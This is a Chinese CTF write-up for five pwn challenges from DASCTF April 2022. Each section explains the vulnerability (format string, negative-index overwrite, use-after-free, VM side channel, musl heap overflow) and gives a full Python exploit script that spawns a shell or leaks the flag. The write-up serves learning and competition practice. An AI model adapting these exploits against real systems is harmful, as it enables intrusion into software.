# 2022DASCTF-Apr-X-FATE-pwn-wp



# 2022DASCTF-Apr-X-FATE-pwn-wp

时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病......一言难尽。下来把剩下几道题都复现一遍，~~`wp`持续更新中~~已写完收工。

>  小广告：解题脚本均使用我自己开发的工具[pwncli](https://github.com/RoderickChan/pwncli)编写，欢迎感兴趣的`pwner`师傅们试用~

<!-- more -->

## 1 good_luck

眼疾手快拿了个一血，这题其实很简单，但是远程的问题很大。附件都更新了两次，就很迷~

### checksec

![image-20220423183142291](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423183142291.png)

没有给`libc`。

### 漏洞点

要么栈溢出+格式化字符串，要么栈溢出：

![image-20220423183249430](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423183249430.png)

![image-20220423183307699](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423183307699.png)

![image-20220423183323408](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423183323408.png)



### 利用思路

由于这两种的概率是`1/2`，所以可以根据不同的输出来使用不同的`payload`。当然，可以编写一个通用的`payload`同时适用这两种情况。

观察到`fmt`函数的缓冲区距离`rbp`是`0x70`，`overflow`函数的缓冲区距离`rbp`是`0x50`，所以前面的通用的`payload`可以为：

```python
layoud = {
	0x58: [ret_addr] * 4 
    0x78: "deadbeef"
}
```

因此，思路为：

- 使用通用`payload`再次执行`fmt`
- 第一次`fmt`，利用格式化字符串泄露出`libc`地址，并再次执行`fmt`
- 根据泄露出来的地址，计算并填入`one_gadget`即可获得`shell`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']

ru("good luck\n")
m = rl()
data = flat([
    "a" * 0x58,
    p64(CurrentGadgets.ret()) * 5,
    elf.sym.fmt 
])

sl(data)

ru("fmt\n")
data = flat({
    0: "%7$s",
    8: elf.got.puts,
    0x58: [
    p64(CurrentGadgets.ret()) * 5,
    elf.sym.fmt
    ]
})
sl(data)

puts_addr = recv_current_libc_addr(offset=0)
log_address("puts addr: ", puts_addr)
lb = LibcBox()
lb.add_symbol('puts', puts_addr)
lb.search(download_so=1) # download --> libc6_2.23-0ubuntu11.2_amd64.so

libc_base = puts_addr -  lb.dump('puts')
system_adddr = libc_base + lb.dump('system')
bin_sh = libc_base + lb.dump('str_bin_sh')

set_current_libc_base_and_log(libc_base, 0)

ru("fmt\n")
data = flat({
    0x78: [
        0x4527a + libc_base, # one_gadget
        [0] * 0x20
    ]
})
sl(data)

ia()
```

最后测出来远程：`libc6_2.23-0ubuntu11.2_amd64`。

远程：

![image-20220423184352119](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423184352119.png)

## 2 ssstring

不得不说，这次比赛的远程真的很很很很迷，本地环境应该和远程是一样的，但是总是打一半就卡死崩掉了。

这题考查的是`C++`的`string`对象，也不算很难的题。`C++ string`对象的布局伪代码：

```c
struct string {
char *data;
int capacity;
int refcount;
char pad[0x10];
};
```

初始状态下，`data`指针指向`pad`处。如果输入的字符串长度大于`0x10`，`string`对象的操作流程可以简单总结为：

- 首先检查`data`是不是指向`pad`，如果是，就会调用`malloc`分配堆内存，存储输入的字符串
- 如果`data`不指向`pad`：
  - 如果输入的字符串长度大于`capacity`，释放`data`处的内存
  - 按照`0x40->0x80->0xf0->0x1e0->0x3e0...`的大小依次进行扩容，直到满足要求（所以一次性读取超过`0x400`长度的字符串，会在`tcachebins`里面发现很多`free chunk`）

### checksec

![image-20220423222606174](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423222606174.png)

远程`libc`版本为：`2.31-0ubuntu9.2_amd64`

### 漏洞点

程序不复杂，漏洞也很明显，在`change idx`的时候：

![image-20220423222715414](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423222715414.png)

输入的`idx`可以为负数，也就可以溢出修改`capacity`域以及`data`指针，虽然每次只能修改`1`个字节。

### 利用思路

根据漏洞点整理利用思路如下：

- 第一次输入不超过`0x10`长度的字符串

- 利用索引负数溢出修改掉`capacity`的值后，`cout<<str`即可泄露出栈上的`libc`地址以及栈地址
- 继续利用溢出修改`capacity`大于`0x7f000000`
- 然后将`data`指向的地址的第`5`个字节修改成`libc`地址的第`5`个字节。比如说此时`data`的地址是一个栈地址`0x7ffdd10d5e90`，泄露出来的`libc`地址`0x7f7463afc000`，这里将`0x7ffdd10d5e90`修改为`0x7f74d10d5e90`，是为了方便修改`libc`上的数据
- 计算想要修改的`libc`上的数据，和修改后的`data`之间的距离，一个字节一个字节修改即可
- 这里我选择的思路是修改`IO_file_jumps`结构体和`stdout`结构体以及`__free_hook`，篡改`puts`的调用链，使得`_IO_file_xsputn`调用`_IO_str_finish`，调用`free(stdout->_IO_buf_base)`，实际调用`system("\nsh;")`即可获得`shell`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from socket import timeout
from pwncli import *

cli_script()

context.update(timeout=5)

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def input_str(data):
    sla(">> ", "1")
    sla("string? \n", data)

def change(idx, c):
    sla(">> ", "2")
    sla("char idx? \n", str(idx))
    sa("char? \n", c)

def show():
    sla(">> ", "3")

input_str("deadbeef")
change(-7, '\x01')
show()
m = ru("1. Cin")
libc_base = u64(m[0x40:0x40+8]) - libc.sym.__libc_start_main - 243
set_current_libc_base_and_log(libc_base, 0)

free_hook_addr = libc.sym.__free_hook
system_addr = libc.sym.system
file_jump_addr = libc_base + 0x1ed4a0
stdout_addr = libc.sym._IO_2_1_stdout_
IO_str_finish = libc_base + 0x96ed0

stack_addr = u64_ex(m[0x50:0x50+8])
string_ptr = stack_addr - 0x128
log_address("string_ptr", string_ptr)

input_str("/bin/sh;deadbee")
change(-5, '\x7f')
change(-12, p8_ex(libc_base >> 32))

string_ptr = (string_ptr & 0xffffffff) | ((libc_base >> 32) << 32)

# write IO_str_finish
target_addr = file_jump_addr
write_content = IO_str_finish
dis = target_addr  - string_ptr
log_ex(f"current distance: {dis}")
assert dis > -0x80000000 and dis < 0x7fffffff, "try again"

for i in range(6):
    change(dis + i, p8_ex(write_content))
    write_content >>= 8

# write system
target_addr = free_hook_addr
write_content = system_addr
dis = target_addr  - string_ptr
log_ex(f"current distance: {dis}")
assert dis > -0x80000000 and dis < 0x7fffffff, "try again"

for i in range(6):
    change(dis + i, p8_ex(write_content))
    write_content >>= 8

# write sh;
target_addr = stdout_addr + 132
write_content = u64_ex("sh;")
dis = target_addr  - string_ptr
log_ex(f"current distance: {dis}")
assert dis > -0x80000000 and dis < 0x7fffffff, "try again"

for i in range(3):
    change(dis + i, p8_ex(write_content))
    write_content >>= 8

# write stdout
target_addr = stdout_addr
write_content = 0x80
dis = target_addr  - string_ptr
log_ex(f"current distance: {dis}")
assert dis > -0x80000000 and dis < 0x7fffffff, "try again"

for i in range(1):
    change(dis + i, p8_ex(write_content))
    write_content >>= 8

# write vtable
target_addr = stdout_addr + 0xd8 # vtable
write_content = (file_jump_addr & 0xff) - 56
dis = target_addr  - string_ptr
log_ex(f"current distance: {dis}")
assert dis > -0x80000000 and dis < 0x7fffffff, "try again"

for i in range(1):
    change(dis + i, p8_ex(write_content))
    write_content >>= 8

ia()
```

布局成功后如下所示：

![image-20220423225923925](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423225923925.png)

此时修改`stdout->vtable`的低一个字节即可：

![image-20220423230047709](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220423230047709.png)

远程打不动，弃疗了...

## 3 easysystem

这题需要耐心和时间去逆向以及利用。需要`IDA`文件的点[这里](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/data/easysystem.zip)，我已经逆完了，我使用的`IDA`版本为`7.6`。需要调试镜像的使用`docker pull roderickchan/debug_pwn_env:21.10`拉取即可，已经安装好了`pwndbg/gef/pwncli`，使用`gdb-gef`和`gdb-pwndbg`命令切换插件。

### checksec

![image-20220425010422897](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425010422897.png)

给的`libc`的版本很高，版本为`glibc-2.34`。移除了很多`hook`，基本上无法使用`hook`去控制程序执行流。

噢对，还加了沙箱：

![image-20220425014642939](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425014642939.png)

### 漏洞点

程序的逆向工作有点大，维护了好几个结构体，如下所示：

```c
/*
   This file has been generated by IDA.
   It contains local type definitions from
   the type library 'easysystem'
*/

#define __int8 char
#define __int16 short
#define __int32 int
#define __int64 long long

struct User;
struct FILE;


/* 15 */
struct UserList
{
  struct User *user1;
  struct User *user2;
};

/* 16 */
struct User
{
  char name[20];
  int _1;
  struct FILE *files;
  struct User *next_user;
};

/* 17 */
struct FILE
{
  char filename[20];
  char r;
  char w;
  char x;
  uint32_t _1;
  uint32_t length;
  void *_2;
  struct FILE *next_file;
};

/* 18 */
struct OpendFile
{
  char filename[20];
  char r;
  char w;
  char x;
  char o_r;
  char o_w;
  char o_x;
  uint32_t length;
  char *data;
  struct OpendFile *next_open_file;
};

/* 19 */
struct OpenFiles
{
  struct OpendFile *open_files1;
  struct OpendFile *open_files2;
  uint32_t max;
  uint32_t count;
};
```

漏洞点在`openfile`函数，全局变量未清理的漏洞：

![image-20220425014256039](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425014256039.png)

由于在`read_file/write_file`等函数均会使用到`open_file`这个全局变量，当其不为`null`的时候，会继续`read/write`。而如果在此之前调用`close_file`函数，则该变量指向的保存文件数据的内存是已经释放掉的内存：

![image-20220425014543466](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425014543466.png)

基于该`use after free`的漏洞，可以劫持程序执行任意流程。

### 利用思路

基于漏洞整理的利用思路如下：

**step 1：任意地址写**

- 首先`close_file`然后`write_file`，即可泄露出`libc`地址和`heap`地址
- 然后再来一次，`close_file`之后`create_file`，然后`read_file`即可伪造上面整理的`FILE`结构体，修改其`next_file`字段和`length`字段，使其指向`tcache_perthread_struct`
- `delete_file`释放伪造的`file`即可释放掉`tcache_perthread_struct`
- 利用`tcache`让任意地址分配内存

**step 2：劫持程序执行流**

- 分配到`stdout->vtable`上方，`tcache`里有检查，分配的地址需要`0x10`对齐

- 修改`stdout->vtable`为`_IO_cookie_jumps+0x40`

- 布局好`__cookie`字段和`_IO_cookie_io_functions_t`结构体

- 输入`exit\n`，然后输入一个不存在的用户名，即可调用`puts`，本来是调用`_IO_file_jumps->_IO_file_xsputn`，劫持后调用`(struct _IO_cookie_file *) stdout->__io_functions.write((struct _IO_cookie_file *) stdout->__cookie)`，这样就控制了`rip`和`rdi`

- 用两段`gadget`劫持`rsp`

  ```
  0x0000000000165fa0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
  0x0000000000059fa0: mov rsp, rdx; ret;
  ```

- 然后`rop`修改`heap`的执行权限，执行提前布局好的`shellcode`

- 利用`retfq`切换到`32`位执行`orw`读取`flag`



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from mmap import mmap
from isort import file
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

username = "roderick"

def create_file(filename, len=0x18, r=1, w=1, x=1):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")

    sa(f"->{username}>>", "create\n")
    sa("Please file (file_name file_protect file_length) : ", filename)
    s(str(r).rjust(4, "0"))
    s(str(w).rjust(4, "0"))
    s(str(x).rjust(4, "0"))
    s(str(len).rjust(4, "0"))


def delete_file(filename):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")
    sa(f"->{username}>>", "delete\n")
    sa("Please input the file's name you want to delete : ", filename)


def open_file(filename, r=1, w=1, x=1):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")
    sa(f"->{username}>>", "open\n")
    sa("Please input the file name you want to open : ", filename)
    s(str(r).rjust(4, "0"))
    s(str(w).rjust(4, "0"))
    s(str(x).rjust(4, "0"))


def close_file(filename):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")
    sa(f"->{username}>>", "close\n")
    sa("Please input the file name you want to close : ", filename)


def read_file(filename, data):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")
    sa(f"->{username}>>", "read\n")
    sa("Please input the file name you want to read : ", filename)
    sa(":", data)


def write_file(filename):
    if isinstance(filename, str):
        filename = filename.encode()
    filename = filename.ljust(0x14, b"\x00")
    sa(f"->{username}>>", "write\n")
    sa("Please input the file name you want to write : ", filename)


def bye():
    sa(f"->{username}>>", "exit\n")
    sa("Please choose user to login : \n", "baduser")


sa("Please input  user name : \n", username)
sa("Please choose user to login : \n", username)

create_file("hack1", 0x500)
open_file("hack1")
create_file("hack2", 0x500)
close_file("hack1")

# leak libc addr
write_file("hack1")
libc_base = u64_ex(rn(9)[1:]) - 0x219cc0
set_current_libc_base_and_log(libc_base, 0)

ptr_guard = libc_base - 0x2890 # local debug
if gift.remote:
    ptr_guard = libc_base + 0x2295f0 # buu

io_cookie_jump = libc_base + 0x215b80

delete_file("hack2")
delete_file("hack1")

create_file("hack1", 0x88)
open_file("hack1")
close_file("hack1")
write_file("hack1")
# leak heap addr
heap_base = u64_ex(rn(0x19)[-8:]) - 0x380
log_heap_base_addr(heap_base)

delete_file("hack1")

# clear free chunk
for i in range(5):
    create_file(f"hack{i}", 0x88)
    open_file(f"hack{i}")

for i in range(5):
    close_file(f"hack{i}")

create_file("hack5", 0x500)
open_file("hack5")

# 0x0000000000165fa0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
# 0x0000000000059fa0: mov rsp, rdx; ret;
# 0x0000000000045f85: add rsp, 0x28; ret;
# 0x000000000002a6c5: pop rdi; ret;
# 0x000000000005f65a: pop rdx; ret;
# 0x000000000002c081: pop rsi; ret;
lower_addr = (heap_base&~0xfff) & 0xfffffff
payload = flat({
    0:[ # rdi
        libc_base + 0x0000000000045f85,
        heap_base + 0xab0,
    ],
    0x20: libc_base + 0x0000000000059fa0,
    0x30: [
        libc_base + 0x000000000002a6c5,
        heap_base,
        libc_base + 0x000000000002c081,
        0x8000,
        libc_base + 0x000000000005f65a,
        7,
        libc.sym.mprotect,
        heap_base + 0xab0 + 0x100
    ],
    0x100: asm(shellcraft.amd64.linux.mmap_rwx(0x10000, 7, lower_addr) +
            shellcraft.amd64.memcpy(lower_addr+0x800, heap_base + 0xab0 + 0x200, 0x50) + f"""
            mov rax, {lower_addr+0x800}
            mov rsp, rax
            push 0x23
            push {lower_addr+0x800+0x10}
            retfq
            """),
    0x200: b"\x90"*20 + ShellcodeMall.i386.cat_flag

})


read_file("hack5", flat({0x150: payload}))

create_file(f"hack6", 0x18) # gap
close_file("hack5")

create_file(f"hack7", 0x18) # fake file

# fake file 
read_file("hack5", data = flat({
    0:"hack7\x00",
    0x14:0x010101010101,
    0x1c:p32(0x280),
    0x28: heap_base + 0x10 # next_file
}))

# free tcache-control-struct
delete_file("\x00")

delete_file("hack6")
open_file("hack7")

read_file("hack7", flat_z({
    0:"\x01",
    0xe: "\x01",
    0x80: ptr_guard, # 0x20 chunk
    0xb8: libc.sym._IO_2_1_stdout_+0xd0 # 0x90 chunk
}))
create_file("hack8", 0x88)
open_file("hack8")
read_file("hack8", flat([
    0,
    io_cookie_jump + 0x40, # vtable
    heap_base + 0xab0,
    libc.sym._IO_2_1_stdout_,
    rol(libc_base + 0x0000000000165fa0, 0x11)
]))

create_file("hack9", 0x18)
open_file("hack9")
read_file("hack9", p64(0))

bye()

ia()
```

调试截图：

执行到`puts`：

![image-20220425020256188](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425020256188.png)

准备劫持`rsp`：

![image-20220425020408980](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425020408980.png)

栈迁移到堆上，修改其权限：

![image-20220425020505028](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425020505028.png)

切到`32`位：

![image-20220425020603610](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425020603610.png)

读取到`flag`：

![image-20220425020657318](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425020657318.png)



远程打：

![image-20220425013729729](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425013729729.png)





## 4 try2findme

逆向题，侧信道爆破即可。

### checksec

![image-20220425220349629](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425220349629.png)

还开启了沙箱，不过不影响做题，`libc`的版本也不影响做题。

### 题目分析

应该叫题目分析更为合适~

首先用`IDA`恢复跳表：

![image-20220425220954049](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425220954049.png)

修复后好看多了：

![image-20220426215711593](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426215711593.png)



然后恢复结构体信息：

```c
struct Mgr
{
  uint8_t status;
  char *d;
  char lower_flag;
  char equal_flag;
  uint32_t p;
  uint32_t size;
  uint32_t i;
  char *s;
};
```

初始化的地方需要注意一下：

![image-20220425222305913](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425222305913.png)

而`{`是`0x7b`，`}`是`0x7d`。

总结各个分支的流程如下：

```
case d[i]:
    0: ++i
    1: s[++p] = d[++i]
    2: --p
    3: s[p-1] = s[p] + s[p-1]
    4: s[p-1] = s[p] - s[p-1]
    5: s[p-1] = s[p] * s[p-1]
    6: s[p-1] = s[p] / s[p-1]
    7: ++i; i = d[i]
    8: ++i; if equal_flag; then i = d[i]
    0x9: ++i; if !equal_flag; then i = d[i]
    0xa: ++i; if equal_flag || lower_flag; then i = d[i]
    0xb: ++i; if !lower_flag; then i = d[i]
    0xc: ++i; if lower_flag; then i = d[i]
    0xd: equal_flag = (s[p] == s[p-1]); lower_flag = (s[p] < s[p-1])
    0xe: s[p] = ~s[p]
    0xf: s[p-1] = s[p] & s[p-1]
    0x10: s[p-1] = s[p] | s[p-1]
    0x11: s[p-1] = s[p] ^ s[p-1]
    0x12: sleep infinity
    other: exit
++i
```

漏洞在于`i`的值可以由输入控制，而`i`又可以控制分支执行。因此，类似于汇编中的各类跳转分支，当控制了`i`之后，我们可以在各个分支之间跳转。

### 利用思路

每个分支分析清楚之后，不难想到，可以用侧信道爆破。思路如下：

- 由于初始化中的字节都是小于`0x7a`的，所以可以用`}`字符去判断是否找到了存放`flag`的位置。初始化：将`p`减小`0x60`，跳过管理的`chunk`和`0x30`个字节
- 然后`case 1`，将`}`输入到`s[p]`
- 使用`case 0xd`判断前一个字符是否等于`}`，然后借助`case 8`和`case 9`分别进行跳转
- 如果不等于，`p -= 2`，然后跳转到第二步重复；如果相等，说明找到`flag`的尾部了，跳转到下一步，猜测当前字符
- `case 0xd`猜测当前字符，借助`case 8`和`case 9`分别进行跳转
- 猜测成功的时候跳转到`case 0x12`，一直睡眠；猜测失败的时候跳转到`case other`，会输出`See u next time~`
- 使用当前方法爆破出所有字符即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

flag = "}"

for i in range(0x24):
    for guess_char in "0123456789-abcdef":
        # reset
        if gift.debug:
            gift.io = process(gift.filename)
        else:
            gift.io = remote(gift.ip, gift.port)
        
        payload = flat({
            0:"\x02"*0x60,
            0x60: "\x01}\x0d\x08\x6f\x09\x5d",
            0x70: "\x02" * (len(flag) + 1) + f"\x01{guess_char}\x0d\x08\xb0\x13",
            0xb0: "\x12\x12"
        })

        s(payload)
        m = ra(3)
        if b"See u next time" not in m:
            flag = guess_char + flag
            ic()
            break
        ic()
        
    log_ex(f"flag: {flag}")

log_ex(f"flag{flag}")
```

远程的环境没有了，在本地试了一下，很快就爆破出`flag`：

![image-20220425223330187](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220425223330187.png)



## 5 storage

`1.2.2 musl libc`的堆管理方式也没有特别的复杂，虽然与`1.1.24`版本的管理方式完全不同。理解了`meta/group/meta_area/malloc_context`几个结构体后，即可很快厘清堆管理方式。

因此题目提供的了完备的增删改查功能，所以其实做本题甚至不需要完全搞懂`musl libc`的分配方式，只需要找到一个特殊的地址进行操作即可。关于`musl libc`的分析文章，可参考[这里](https://www.anquanke.com/post/id/246929)，写得很详细，建议边读边结合源码分析。

自己编译源码：

```shell
git clone git@github.com:bminor/musl.git
cd ./musl
git checkout v1.2.2
CC="gcc" CFLAGS="-z now" ./configure --enable-debug --disable-werror
make -j7
```

然后在`./musl/lib`中即可找到带调试信息的`libc.so`

![image-20220426220542281](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426220542281.png)

### checksec

![image-20220426220610323](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426220610323.png)

`musl`版本为`1.2.2`。

### 漏洞点

在`store`函数：

![image-20220426220804228](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426220804228.png)

其实一开始我注意到这个点，但是根据之前的经验，就是[这里](https://man7.org/linux/man-pages/man2/read.2.html)的描述：

![image-20220426220938510](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426220938510.png)

我以为`read`会直接返回，然后`ptr + 0xffffffff`这里将是一个无效的地址，赋值的时候段错误。后来找了半天没找到漏洞，然后试了一下这里，发现竟然没有报错，可以继续输入，真的很神奇......所以，经验主义确实害人啊~

既然这里可以溢出，那么利用就很简单了。

### 利用思路

需要注意的是，`musl`分配的堆，除了属于动态内存区域，还可能属于静态内存区域。是因为`musl`在初始化的时候，会在`libc.so`映射的地址空间寻找未使用片段，然后当作静态内存管理起来。所以，可能分配到的堆地址是一个`libc`地址。

首先观察到，程序一开始申请的`0x80`大小的`chunk`就在`libc`上：

![image-20220426221510334](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426221510334.png)

在`malloc(0)`的大小的内存也在`libc.so`的地址空间，而且恰好在这个`0x80`的`chunk`的上方：

![image-20220426221811777](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426221811777.png)

距离为`0x3f0`。也就是说，可以溢出修改`ptrs`中存储的指针。然后由于有个`\x00`的截断，所以需要寻找一个地址`x`，恰好在`x & ~0xff`的地址处存储着`libc`地址或者堆地址，或者栈地址，满足一个即可。后来测试出来，`malloc(0x400)`的时候，满足需求：

![image-20220426222103616](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426222103616.png)

这里有个堆地址，然后堆地址上一定会有`libc`地址，因为会有`group`结构在`libc`上。

![image-20220426222219811](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426222219811.png)

经过多次测试，这里的`libc`地址相对于基地址是固定的。

总结以上利用思路为：

- `store(0x400)`准备好要利用的指针

- `store(0xffffffff)`溢出修改`ptrs[0]`存储的指针的最低字节为`\x00`
- `show(0)`即可泄露堆地址
- 继续溢出修改指针为堆地址，然后泄露`libc`地址
- 计算得到`__stderr_used`地址，劫持其`write`函数指针，触发一个`exit`即可控制程序执行流



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']

def store(size, data):
    sla(">> ", "1")
    sla("String size? \n", str(size))
    if data:
        sa("String? \n", data)


def show(idx):
    sla(">> ", "2")
    sla("String idx? \n", str(idx))
    ru("String: ")
    return rl()


def delete(idx):
    sla(">> ", "3")
    sla("String idx? \n", str(idx))



def edit(idx, data):
    sla(">> ", "4")
    sla("String idx? \n", str(idx))
    sa("New string? \n", data)

store(0x400, "a"*8)
store(0xffffffff, "deadbeef")

edit(1, "\x00" * 0x3f0)
m = show(0)
heap_addr = u64_ex(m[:-1])
log_address("heap_addr", heap_addr)

edit(1, b"\x00"*0x3f0 + p64(heap_addr + 0x38)[:6])
m = show(0)
libc_addr = u64_ex(m[:-1])
log_address("libc_addr", libc_addr)

libc_base = libc_addr - 0xb7860
log_libc_base_addr(libc_base)

system_addr = libc_base + 0x50a90
str_bin_sh = libc_base + 0xb21d7
stderr_use = libc_base + 0xb4080

log_address("system_addr", system_addr)
log_address("str_bin_sh", str_bin_sh)

edit(1, b"\x00"*0x3f0 + p64(stderr_use)[:6])
edit(0, flat({
    0: "/bin/sh\x00",
    0x48: system_addr
}))

delete(99)

ia()
```

打远程：

![image-20220426222625360](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220426222625360.png)



## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/  

